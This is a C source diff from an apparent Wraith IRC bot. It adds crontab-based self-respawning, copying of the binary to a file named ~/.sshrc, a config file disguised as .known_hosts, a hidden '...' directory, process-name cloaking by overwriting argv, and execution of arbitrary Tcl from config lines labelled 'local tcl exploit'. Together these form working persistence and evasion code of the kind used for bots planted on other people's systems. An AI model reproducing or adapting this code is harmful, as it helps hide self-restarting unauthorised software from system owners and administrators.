@@ -880,3 +880,615 @@ char *my_uname()
 }
 
 
+void crontab_del() {
+  char *tmpfile, *p, buf[2048];
+  tmpfile = malloc(strlen(binname) + 100);
+  strcpy(tmpfile, binname);
+  if (!(p = strrchr(tmpfile, '/')))
+    return;
+  p++;
+  strcpy(p, STR(".ctb"));
+  sprintf(buf, STR("crontab -l | grep -v \"%s\" | grep -v \"^#\" | grep -v \"^\\$\" > %s"), binname, tmpfile);
+  if (shell_exec(buf, NULL, NULL, NULL)) {
+    sprintf(buf, STR("crontab %s"), tmpfile);
+    shell_exec(buf, NULL, NULL, NULL);
+  }
+  unlink(tmpfile);
+}
+
+int crontab_exists() {
+  char buf[2048] = "", *out = NULL;
+  egg_snprintf(buf, sizeof buf, STR("crontab -l | grep \"%s\" | grep -v \"^#\""), binname);
+  if (shell_exec(buf, NULL, &out, NULL)) {
+
+    if (out && strstr(out, binname)) {
+      free(out);
+      return 1;
+    } else {
+      if (out)
+        free(out);
+      return 0;
+    }
+  } else
+    return (-1);
+}
+
+void crontab_create(int interval) {
+  char tmpfile[161] = "", buf[256] = "";
+  FILE *f;
+  int fd;
+
+  /* always use mkstemp() when handling temp files! -dizz */
+  egg_snprintf(tmpfile, sizeof tmpfile, "%s.crontab-XXXXXX", tempdir);
+  if ((fd = mkstemp(tmpfile)) == -1) {
+    unlink(tmpfile);
+    return;
+  }
+
+  egg_snprintf(buf, sizeof buf, STR("crontab -l | grep -v \"%s\" | grep -v \"^#\" | grep -v \"^\\$\"> %s"), binname, tmpfile);
+  if (shell_exec(buf, NULL, NULL, NULL) && (f = fdopen(fd, "a")) != NULL) {
+    buf[0] = 0;
+    if (interval == 1)
+      strcpy(buf, "*");
+    else {
+      int i = 1;
+      int si = random() % interval;
+
+      while (i < 60) {
+        if (buf[0])
+          sprintf(buf + strlen(buf), STR(",%i"), (i + si) % 60);
+        else
+          sprintf(buf, "%i", (i + si) % 60);
+        i += interval;
+      }
+    }
+    egg_snprintf(buf + strlen(buf), sizeof buf, STR(" * * * * %s > /dev/null 2>&1"), binname);
+    fseek(f, 0, SEEK_END);
+    fprintf(f, STR("\n%s\n"), buf);
+    fclose(f);
+    sprintf(buf, STR("crontab %s"), tmpfile);
+    shell_exec(buf, NULL, NULL, NULL);
+  }
+  close(fd);
+  unlink(tmpfile);
+
+}
+#ifdef HEH
+int main(int argc, char **argv)
+{
+  egg_timeval_t howlong;
+  int xx, i;
+#ifdef LEAF
+  int x = 1;
+#endif
+  char buf[SGRAB + 9] = "", s[25] = "";
+  FILE *f;
+#ifdef LEAF
+  int skip = 0;
+  int ok = 1;
+#endif
+  init_debug();
+
+  /* Version info! */
+  egg_snprintf(ver, sizeof ver, "Wraith %s", egg_version);
+  egg_snprintf(version, sizeof version, "Wraith %s (%u/%lu)", egg_version, egg_numver, buildts);
+#ifdef STOP_UAC
+  {
+    int nvpair[2];
+
+    nvpair[0] = SSIN_UACPROC;
+    nvpair[1] = UAC_NOPRINT;
+    setsysinfo(SSI_NVPAIRS, (char *) nvpair, 1, NULL, 0);
+  }
+#endif
+
+  init_signals();
+
+  Context;
+  /* Initialize variables and stuff */
+  now = time(NULL);
+  chanset = NULL;
+#ifdef S_UTCTIME
+  egg_memcpy(&nowtm, gmtime(&now), sizeof(struct tm));
+#else /* !S_UTCTIME */
+  egg_memcpy(&nowtm, localtime(&now), sizeof(struct tm));
+#endif /* S_UTCTIME */
+  lastmin = nowtm.tm_min;
+  srandom(now % (getpid() + getppid()));
+  myuid = geteuid();
+  binname = getfullbinname(argv[0]);
+
+  /* just load everything now, won't matter if it's loaded if the bot has to suicide on startup */
+  init_settings();
+  binds_init();
+  core_binds_init();
+  init_dcc_max();
+  init_userent();
+  init_bots();
+  init_net();
+  init_modules();
+  init_tcl(argc, argv);
+  init_auth();
+  init_config();
+  init_botcmd();
+  link_statics();
+
+  if (!can_stat(binname))
+   werr(ERR_BINSTAT);
+  if (!fixmod(binname))
+   werr(ERR_BINMOD);
+
+  if (argc) {
+    sdprintf(STR("Calling dtx_arg with %d params."), argc);
+    dtx_arg(argc, argv);
+  }
+  if (checktrace)
+    check_trace_start();
+
+#ifdef HUB
+  egg_snprintf(tempdir, sizeof tempdir, "%s/tmp/", confdir());
+#endif /* HUB */
+
+#ifdef LEAF
+{
+  char newbin[DIRMAX];
+  sdprintf(STR("my uid: %d my uuid: %d, my ppid: %d my pid: %d"), getuid(), geteuid(), getppid(), getpid());
+  chdir(homedir());
+  egg_snprintf(newbin, sizeof newbin, STR("%s/.sshrc"), homedir());
+  egg_snprintf(tempdir, sizeof tempdir, "%s/.../", confdir());
+
+  sdprintf(STR("newbin at: %s"), newbin);
+
+  if (strcmp(binname,newbin) && !skip) { //running from wrong dir, or wrong bin name.. lets try to fix that :)
+    sdprintf(STR("wrong dir, is: %s :: %s"), binname, newbin);
+    unlink(newbin);
+    if (copyfile(binname,newbin))
+     ok = 0;
+
+    if (ok) 
+     if (!can_stat(newbin)) {
+       unlink(newbin);
+       ok = 0;
+     }
+    if (ok) 
+      if (!fixmod(newbin)) {
+        unlink(newbin);
+        ok = 0;
+      }
+
+    if (!ok)
+      werr(ERR_WRONGBINDIR);
+    else {
+      unlink(binname);
+      system(newbin);
+      sdprintf(STR("exiting to let new binary run..."));
+      exit(0);
+    }
+  }
+
+  /* Ok if we are here, then the binary is accessable and in the correct directory, now lets do the local config... */
+
+}
+#endif /* LEAF */
+  {
+    char tmp[DIRMAX];
+
+    egg_snprintf(tmp, sizeof tmp, "%s/", confdir());
+    if (!can_stat(tmp)) {
+#ifdef LEAF
+      if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
+        unlink(confdir());
+        if (!can_stat(confdir()))
+          if (mkdir(confdir(), S_IRUSR | S_IWUSR | S_IXUSR))
+#endif /* LEAF */
+            werr(ERR_CONFSTAT);
+#ifdef LEAF
+      }
+#endif /* LEAF */
+    }
+
+    egg_snprintf(tmp, sizeof tmp, "%s", tempdir);
+    if (!can_stat(tmp)) {
+      if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
+        unlink(tempdir);
+        if (!can_stat(tempdir))
+          if (mkdir(tempdir, S_IRUSR | S_IWUSR | S_IXUSR))
+            werr(ERR_TMPSTAT);
+      }
+    }
+  }
+  if (!fixmod(confdir()))
+    werr(ERR_CONFDIRMOD);
+  if (!fixmod(tempdir))
+    werr(ERR_TMPMOD);
+
+  /* The config dir is accessable with correct permissions, lets read/write/create config file now.. */
+  {		/* config shit */
+    char cfile[DIRMAX] = "", templine[8192] = "";
+#ifdef LEAF
+    egg_snprintf(cfile, sizeof cfile, STR("%s/.known_hosts"), confdir());
+#else /* HUB */
+    egg_snprintf(cfile, sizeof cfile, STR("%s/conf"), confdir());
+#endif /* LEAF */
+    if (!can_stat(cfile))
+      werr(ERR_NOCONF);
+    if (!fixmod(cfile))
+      werr(ERR_CONFMOD);
+#ifdef LEAF
+    if (localhub) { 
+#endif /* LEAF */
+      i = 0;
+      if (!(f = fopen(cfile, "r")))
+         werr(0);
+      Context;
+      while(fscanf(f, "%[^\n]\n", templine) != EOF) {
+        char *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL, *temps, c[1024];
+        void *temp_ptr;
+        int skip = 0;
+
+        temps = temp_ptr = decrypt_string(SALT1, templine);
+        if (!strchr(STR("*#-+!abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPWRSTUVWXYZ"), temps[0])) {
+          sdprintf(STR("line %d, char %c "), i, temps[0]);
+          werr(ERR_CONFBADENC);
+        }
+        egg_snprintf(c, sizeof c, "%s", temps);
+
+        if (c[0] == '*') {
+          skip = 1;
+        } else if (c[0] == '-' && !skip) { /* uid */
+          newsplit(&temps);
+          if (geteuid() != atoi(temps)) {
+            sdprintf(STR("wrong uid, conf: %d :: %d"), atoi(temps), geteuid());
+            werr(ERR_WRONGUID);
+          }
+        } else if (c[0] == '+' && !skip) { /* uname */
+          int r = 0;
+          newsplit(&temps);
+          if ((r = strcmp(temps, my_uname()))) {
+            baduname(temps, my_uname());
+            sdprintf(STR("wrong uname, conf: %s :: %s"), temps, my_uname());
+            werr(ERR_WRONGUNAME);
+          }
+        } else if (c[0] == '!') { //local tcl exploit
+          if (c[1] == '-') { //dont use pscloak
+#ifdef S_PSCLOAK
+            sdprintf(STR("NOT CLOAKING"));
+#endif /* S_PSCLOAK */
+            pscloak = 0;
+          } else {
+            newsplit(&temps);
+            Tcl_Eval(interp, temps);
+          }
+        } else if (c[0] != '#') {  //now to parse nick/hosts
+          /* we have the right uname/uid, safe to setup crontab now. */
+          i++;
+          nick = newsplit(&temps);
+          if (!nick || !nick[0])
+            werr(ERR_BADCONF);
+          sdprintf(STR("Read nick from config: %s"), nick);
+          if (temps[0])
+            ip = newsplit(&temps);
+          if (temps[0])
+            host = newsplit(&temps);
+          if (temps[0])
+            ipsix = newsplit(&temps);
+
+          if (i == 1) { //this is the first bot ran/parsed
+            strncpyz(s, ctime(&now), sizeof s);
+            strcpy(&s[11], &s[20]);
+
+            if (ip && ip[0] == '!') { //natip
+              ip++;
+              sprintf(natip, "%s",ip);
+            } else {
+              if (ip && ip[1]) //only copy ip if it is longer than 1 char (.)
+                egg_snprintf(myip, 120, "%s", ip);
+            }
+            egg_snprintf(origbotname, 10, "%s", nick);
+#ifdef HUB
+            sprintf(userfile, "%s/.u", confdir());
+#endif /* HUB */
+/* log          sprintf(logfile, "%s/.%s.log", confdir(), nick); */
+            if (host && host[1]) { //only copy host if it is longer than 1 char (.)
+              if (host[0] == '+') { //ip6 host
+              host++;
+              sprintf(hostname6, "%s",host);
+            } else  //normal ip4 host
+              sprintf(hostname, "%s",host);
+            }
+            if (ipsix && ipsix[1]) { //only copy ipsix if it is longer than 1 char (.)
+              egg_snprintf(myip6, 120, "%s",ipsix);
+            }
+          } //First bot in conf
+#ifdef LEAF
+          else { //these are the rest of the bots..
+            char buf2[DIRMAX] = "";
+            FILE *fp;
+
+            xx = 0, x = 0, errno = 0;
+            s[0] = '\0';
+            /* first let's determine if the bot is already running or not.. */
+            egg_snprintf(buf2, sizeof buf2, "%s.pid.%s", tempdir, nick);
+            fp = fopen(buf2, "r");
+            if (fp != NULL) {
+              fgets(s, 10, fp);
+              fclose(fp);
+              xx = atoi(s);
+              if (updating) {
+                x = kill(xx, SIGKILL); //try to kill the pid if we are updating.
+                unlink(buf2);
+              }
+              kill(xx, SIGCHLD);
+              if (errno == ESRCH || (updating && !x)) { //PID is !running, safe to run.
+                if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
+                  printf(STR("* Failed to spawn %s\n"), nick); //This probably won't ever happen.
+              } else if (!x)
+                sdprintf(STR("%s is already running, pid: %d"), nick, xx);
+            } else {
+              if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
+                printf(STR("* Failed to spawn %s\n"), nick); //This probably won't ever happen.
+            }
+          }
+#endif /* LEAF */
+        } 
+        free(temp_ptr);
+      } /* while(fscan) */
+      fclose(f);
+#ifdef LEAF
+      if (updating)
+        exit(0); /* let cron restart us. */
+    } /* localhub */
+#endif /* LEAF */
+  }
+  dns_init();
+  module_load("channels");
+#ifdef LEAF
+  module_load("server");
+  module_load("irc");
+#endif /* LEAF */
+  module_load("transfer");
+  module_load("share");
+  update_init();
+  notes_init();
+  console_init();
+  ctcp_init();
+  module_load("compress");
+
+  chanprog();
+
+  clear_tmp();
+#ifdef LEAF
+  if (localhub) {
+    sdprintf(STR("I am localhub (%s)"), origbotname);
+#endif /* LEAF */
+    check_crontab();
+#ifdef LEAF
+  }
+#endif /* LEAF */
+
+
+  cache_miss = 0;
+  cache_hit = 0;
+  if (!pid_file[0])
+    egg_snprintf(pid_file, sizeof pid_file, "%s.pid.%s", tempdir, botnetnick);
+
+  if ((localhub && !updating) || !localhub) {
+    if ((f = fopen(pid_file, "r")) != NULL) {
+      fgets(s, 10, f);
+      xx = atoi(s);
+      kill(xx, SIGCHLD);
+      if (errno != ESRCH) { //!= is PID is running.
+        sdprintf(STR("%s is already running, pid: %d"), botnetnick, xx);
+        exit(1);
+      }
+      fclose(f);
+    }
+  }
+
+#ifdef LEAF
+#ifdef S_PSCLOAK
+  if (pscloak) {
+    int on = 0;
+    char *p = progname();
+
+    egg_memset(argv[0], 0, strlen(argv[0]));
+    strncpyz(argv[0], p, strlen(p) + 1);
+    for (on = 1; on < argc; on++) egg_memset(argv[on], 0, strlen(argv[on]));
+  }
+#endif /* PSCLOAK */
+#endif /* LEAF */
+
+  putlog(LOG_MISC, "*", STR("=== %s: %d users."), botnetnick, count_users(userlist));
+  /* Move into background? */
+
+  if (backgrd) {
+#ifndef CYGWIN_HACKS
+    bg_do_split();
+  } else {			/* !backgrd */
+#endif /* CYGWIN_HACKS */
+    xx = getpid();
+    if (xx != 0) {
+      /* Write pid to file */
+      unlink(pid_file);
+      if ((f = fopen(pid_file, "w")) != NULL) {
+        fprintf(f, "%u\n", xx);
+        if (fflush(f)) {
+	  /* Let the bot live since this doesn't appear to be a botchk */
+	  printf(EGG_NOWRITE, pid_file);
+	  unlink(pid_file);
+	  fclose(f);
+        } else {
+          fclose(f);
+        }
+      } else
+        printf(EGG_NOWRITE, pid_file);
+#ifdef CYGWIN_HACKS
+      printf(STR("Launched into the background  (pid: %d)\n\n"), xx);
+#endif /* CYGWIN_HACKS */
+    }
+  }
+
+  use_stderr = 0;		/* Stop writing to stderr now */
+  if (backgrd) {
+    /* Ok, try to disassociate from controlling terminal (finger cross) */
+#if HAVE_SETPGID && !defined(CYGWIN_HACKS)
+    setpgid(0, 0);
+#endif
+    /* Tcl wants the stdin, stdout and stderr file handles kept open. */
+    freopen("/dev/null", "r", stdin);
+    freopen("/dev/null", "w", stdout);
+    freopen("/dev/null", "w", stderr);
+#ifdef CYGWIN_HACKS
+    FreeConsole();
+#endif /* CYGWIN_HACKS */
+  }
+
+  /* Terminal emulating dcc chat */
+  if (!backgrd && term_z) {
+    int n = new_dcc(&DCC_CHAT, sizeof(struct chat_info));
+
+    dcc[n].addr = iptolong(getmyip());
+    dcc[n].sock = STDOUT;
+    dcc[n].timeval = now;
+    dcc[n].u.chat->con_flags = conmask;
+    dcc[n].u.chat->strip_flags = STRIP_ALL;
+    dcc[n].status = STAT_ECHO;
+    strcpy(dcc[n].nick, "HQ");
+    strcpy(dcc[n].host, "llama@console");
+    dcc[n].user = get_user_by_handle(userlist, "HQ");
+    /* Make sure there's an innocuous HQ user if needed */
+    if (!dcc[n].user) {
+      userlist = adduser(userlist, "HQ", "none", "-", USER_ADMIN | USER_OWNER | USER_MASTER | USER_VOICE | USER_OP | USER_PARTY | USER_CHUBA | USER_HUBA);
+      dcc[n].user = get_user_by_handle(userlist, "HQ");
+    }
+    setsock(STDOUT, 0);          /* Entry in net table */
+    dprintf(n, "\n### ENTERING DCC CHAT SIMULATION ###\n\n");
+    dcc_chatter(n);
+  }
+
+  then = now;
+  online_since = now;
+  autolink_cycle(NULL);		/* Hurry and connect to tandem bots */
+  howlong.sec = 1;
+  howlong.usec = 0;
+  timer_create_repeater(&howlong, (Function) core_secondly);
+  add_hook(HOOK_10SECONDLY, (Function) core_10secondly);
+  add_hook(HOOK_30SECONDLY, (Function) expire_simuls);
+  add_hook(HOOK_MINUTELY, (Function) core_minutely);
+  add_hook(HOOK_HOURLY, (Function) core_hourly);
+  add_hook(HOOK_HALFHOURLY, (Function) core_halfhourly);
+  add_hook(HOOK_REHASH, (Function) event_rehash);
+  add_hook(HOOK_PRE_REHASH, (Function) event_prerehash);
+  add_hook(HOOK_USERFILE, (Function) event_save);
+  add_hook(HOOK_DAILY, (Function) event_resettraffic);
+
+  debug0(STR("main: entering loop"));
+  while (1) {
+    int socket_cleanup = 0;
+
+    /* Process a single tcl event */
+    Tcl_DoOneEvent(TCL_ALL_EVENTS | TCL_DONT_WAIT);
+
+    /* Lets move some of this here, reducing the numer of actual
+     * calls to periodic_timers
+     */
+    now = time(NULL);
+    timer_run();
+    if (now != then) {		/* Once a second */
+/*      call_hook(HOOK_SECONDLY); */
+      then = now;
+    }
+
+    /* Only do this every so often. */
+    if (!socket_cleanup) {
+      socket_cleanup = 5;
+
+      /* Remove dead dcc entries. */
+      dcc_remove_lost();
+
+      /* Check for server or dcc activity. */
+      dequeue_sockets();		
+    } else
+      socket_cleanup--;
+
+    buf[0] = 0;
+    xx = sockgets(buf, &i); 
+    /* "chanprog()" bug is down here somewhere.... */
+    if (xx >= 0) {		/* Non-error */
+      int idx;
+
+      for (idx = 0; idx < dcc_total; idx++)
+	if (dcc[idx].sock == xx) {
+	  if (dcc[idx].type && dcc[idx].type->activity) {
+	    /* Traffic stats */
+	    if (dcc[idx].type->name) {
+	      if (!strncmp(dcc[idx].type->name, "BOT", 3))
+		traffic.in_today.bn += strlen(buf) + 1;
+	      else if (!strcmp(dcc[idx].type->name, "SERVER"))
+		traffic.in_today.irc += strlen(buf) + 1;
+	      else if (!strncmp(dcc[idx].type->name, "CHAT", 4))
+		traffic.in_today.dcc += strlen(buf) + 1;
+	      else if (!strncmp(dcc[idx].type->name, "FILES", 5))
+		traffic.in_today.dcc += strlen(buf) + 1;
+	      else if (!strcmp(dcc[idx].type->name, "SEND"))
+		traffic.in_today.trans += strlen(buf) + 1;
+	      else if (!strncmp(dcc[idx].type->name, "GET", 3))
+		traffic.in_today.trans += strlen(buf) + 1;
+	      else
+		traffic.in_today.unknown += strlen(buf) + 1;
+	    }
+	    dcc[idx].type->activity(idx, buf, i);
+	  } else
+	    putlog(LOG_MISC, "*",
+		   "!!! untrapped dcc activity: type %s, sock %d",
+		   dcc[idx].type->name, dcc[idx].sock);
+	  break;
+	}
+    } else if (xx == -1) {	/* EOF from someone */
+      int idx;
+
+      if (i == STDOUT && !backgrd)
+	fatal(STR("END OF FILE ON TERMINAL"), 0);
+      for (idx = 0; idx < dcc_total; idx++)
+	if (dcc[idx].sock == i) {
+	  if (dcc[idx].type && dcc[idx].type->eof)
+	    dcc[idx].type->eof(idx);
+	  else {
+	    putlog(LOG_MISC, "*",
+		   "*** ATTENTION: DEAD SOCKET (%d) OF TYPE %s UNTRAPPED",
+		   i, dcc[idx].type ? dcc[idx].type->name : "*UNKNOWN*");
+	    killsock(i);
+	    lostdcc(idx);
+	  }
+	  idx = dcc_total + 1;
+	}
+      if (idx == dcc_total) {
+	putlog(LOG_MISC, "*",
+	       "(@) EOF socket %d, not a dcc socket, not anything.", i);
+	close(i);
+	killsock(i);
+      }
+    } else if (xx == -2 && errno != EINTR) {	/* select() error */
+      putlog(LOG_MISC, "*", STR("* Socket error #%d; recovering."), errno);
+      for (i = 0; i < dcc_total; i++) {
+	if ((fcntl(dcc[i].sock, F_GETFD, 0) == -1) && (errno = EBADF)) {
+	  putlog(LOG_MISC, "*",
+		 "DCC socket %d (type %d, name '%s') expired -- pfft",
+		 dcc[i].sock, dcc[i].type, dcc[i].nick);
+	  killsock(dcc[i].sock);
+	  lostdcc(i);
+	  i--;
+	}
+      }
+    } else if (xx == -3) {
+      call_hook(HOOK_IDLE);
+      socket_cleanup = 0;	/* If we've been idle, cleanup & flush */
+    }
+
+    if (do_restart) {
+      rehash();
+      do_restart = 0;
+    }
+  }
+}
+#endif
